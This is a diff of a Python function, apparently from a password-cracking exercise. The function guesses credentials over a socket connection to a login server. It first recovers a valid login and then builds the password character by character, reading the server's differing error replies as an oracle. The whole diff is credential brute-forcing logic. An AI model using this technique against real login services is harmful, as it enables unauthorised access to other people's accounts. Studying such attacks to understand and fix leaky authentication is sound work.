@@ -17,21 +17,46 @@ def check_creds(socket_conn: socket, creds_data: list[str], creds_type: str) -> 
                 cracked_creds[creds_type] = val_combo
                 response = socket_operation(socket_connection=socket_conn,
                                             msg_to_send=json.dumps(cracked_creds))
-                if verify_creds_crack(msg=response):
+                # if creds_type == "login":
+                #     cracked_creds[creds_type] = val_combo
+                #     response = socket_operation(socket_connection=socket_conn,
+                #                                 msg_to_send=json.dumps(cracked_creds))
+
+                # login found
+                if json.loads(response)["result"] == "Wrong password!":
                     return val_combo
 
-                if pwd_chars:
-                    while not verify_creds_crack(msg=response):
-                        if verify_creds_crack(msg=response):
-                            pwd_chars.append(val_combo)
-                        return cracked_creds
+                elif json.loads(response)["result"] == "Exception happened during login":
+                    pwd_chars.append(val_combo)
+                    return
+                # elif creds_type == "password":
+                #     cracked_creds[creds_type] = val_combo
+                #     response = socket_operation(socket_connection=socket_conn,
+                #                                 msg_to_send=json.dumps(cracked_creds))
+                #     if json.loads(response)["result"] == "Exception happened during login":
+                #         pwd_chars.append(val_combo)
+                #         check_creds(socket_conn=socket_conn,
+                #                     creds_data=ALL_ELEMENTS_STR,
+                #                     creds_type="password")
+
+                # both match - cracked
+                elif json.loads(response)["result"] == "Connection success!":
+                    return val_combo
 
         cracked_creds[creds_type] = val
         response = socket_operation(socket_connection=socket_conn,
                                     msg_to_send=json.dumps(cracked_creds))
-        if verify_creds_crack(msg=response):
-            if creds_type in ("password", "creds"):
-                pwd_chars.append(val)
+
+        # login found
+        if json.loads(response)["result"] == "Wrong password!":
+            return val
+
+        elif json.loads(response)["result"] == "Exception happened during login":
+            pwd_chars.append(val)
+            return
+
+        # both match - cracked
+        elif json.loads(response)["result"] == "Connection success!":
             return val
 
 
